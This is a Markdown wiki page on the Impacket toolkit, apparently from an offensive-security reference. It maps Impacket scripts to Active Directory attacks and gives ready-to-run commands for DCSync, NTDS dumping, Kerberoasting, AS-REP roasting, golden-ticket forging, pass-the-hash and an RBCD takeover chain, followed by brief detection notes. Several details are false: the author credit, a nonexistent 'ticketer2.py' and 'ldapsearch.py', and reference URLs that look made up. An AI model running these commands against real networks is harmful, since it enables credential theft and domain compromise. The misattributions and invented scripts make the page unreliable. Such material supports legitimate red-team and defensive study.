---
title: Impacket
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, python, cross-platform, post-exploitation, kerberos, smb]
---

# Impacket

**Impacket** (originally SecureAuth, now a community project; key author
Carlos Perez / alcdiaz) is a Python **library + script suite** for Windows
network protocols (SMB, Kerberos, LDAP, DRSUAPI, WMI, WinRM, MSSQL, RDP).
It runs from **Linux**, which makes it the default for protocol-level AD
attacks and hash dumping without a Windows host. Nearly every technique in
this wiki has an Impacket script.

## The scripts that matter here

| Script | Technique | Page |
| --- | --- | --- |
| `secretsdump.py` | offline NTDS/SAM/LSA + DCSync (`-just-dc`, `-ntds`) | [[secretsdump]], [[ntds-dit]], [[sam-database]], [[dcsync]] |
| `GetUserSPNs.py` | Kerberoast (request TGS for SPN accounts) | [[kerberoasting]] |
| `GetNPUsers.py` | AS-REP roast (preauth-disabled accounts) | [[as-rep-roasting]], [[kerberos-preauth]] |
| `ntlmrelayx.py` | NTLM relay (SMB/LDAP/AD CS/WCF/HTTP) | [[ntlm-relay-coercion]], [[ntlmrelayx]] |
| `psexec.py` / `wmiexec.py` / `smbexec.py` / `atexec.py` | exec on target (Kerberos `-k` / hash `-hashes`) | [[pass-the-hash-and-ticket|PtH/PtT]] |
| `ticketer.py` | forge TGT (Golden) / TGS (Silver) | [[golden-silver-tickets]], [[diamond-ticket]] |
| `getTGT.py` | get a TGT from a key (PtK) | [[pass-the-key]] |
| `ticketer2.py` | shadow-credential cert auth (PKINIT) | [[shadow-credentials]] |
| `getST.py` | RBCD S4U2Proxy — mint a TGS to a target as a user | [[resource-based-constrained-delegation]], [[s4u2self-s4u2proxy]] |
| `addcomputer.py` | create a computer account (RBCD / addcomputer relay step) | [[resource-based-constrained-delegation]], [[service-account]] |
| `rbcd.py` | write the RBCD attribute on a target computer | [[resource-based-constrained-delegation]], [[ldap]] |
| `dacledit.py` / `owneredit.py` | write ACLs / take ownership | [[acl-abuse]], [[ldap]] |
| `ldapsearch.py` / `samrdump.py` / `lookupsid.py` | enumeration (LDAP reads) | [[bloodhound]]-adjacent, [[ldap]] |
| `secretsdump.py` `-just-dc-user krbtgt` | DCSync a single account (krbtgt) | [[secretsdump]], [[krbtgt]] |

## Common invocations

```bash
# DCSync krbtgt (Kerberos auth)
secretsdump.py -k -no-pass corp.local/Administrator@dc01.corp.local -just-dc-user krbtgt

# Offline NTDS + SAM dump
secretsdump.py -ntds "ntds.dit" -system "SYSTEM" -security "SECURITY"

# Kerberoast (all SPN accounts, hashcat format)
GetUserSPNs.py CORP/user:pass -dc-ip <dc> -request -format hashcat -outputfile spn.txt

# AS-REP roast (user list)
GetNPUsers.py CORP/ -dc-ip <dc> -usersfile users.txt -format hashcat -request

# Golden ticket via ticketer
ticketer.py -domain corp.local -dc-ip <dc> -nthash <krbtgt-nt> -user Administrator -groups Domain\ Admins -timing 10:0:0

# Pass the hash exec
psexec.py -hashes <lm>:<nt> CORP/user@<target>

# RBCD (create a computer account, grant it RBCD on the target, mint the TGS)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' CORP/user:pass
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write CORP/user:pass
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator -dc-ip <dc> 'CORP/EVIL$:Passw0rd!'
```

## Detection

- **SMB/LDAP/Kerberos protocol artifacts** — the events the scripts drive
  (4662 DCSync, 4768/4769, 4624 Type 3).
- **Outbound SMB from Linux** (a non-Windows source IP doing SMB/DRSUAPI is a
  strong tell).
- Command lines on the attacker host (4688 if on Windows).

## Links

- [[dcsync]], [[ntds-dit]], [[sam-database]] — the dumps
- [[kerberoasting]], [[as-rep-roasting]] — the roasts
- [[ntlmrelayx]] — its relay script
- [[golden-silver-tickets]], [[diamond-ticket]], [[pass-the-key|PtK]] — its ticket tools
- [[resource-based-constrained-delegation]] — the RBCD scripts (getST/addcomputer/rbcd)
- [[smb]], [[ldap]], [[ccache]] — the protocols + ticket cache the scripts drive
- [[service-account]] — the account types the dumps/roasts target
- [[rubeus]] — the Windows-side contrast
- [[mimikatz]] — the injection-based contrast

## References

- [Impacket project](https://impacket-projects.github.io/)
- [Impacket documentation](https://docs.impacket-project.org/)
- [ired.team: Impacket](https://www.ired.team/)
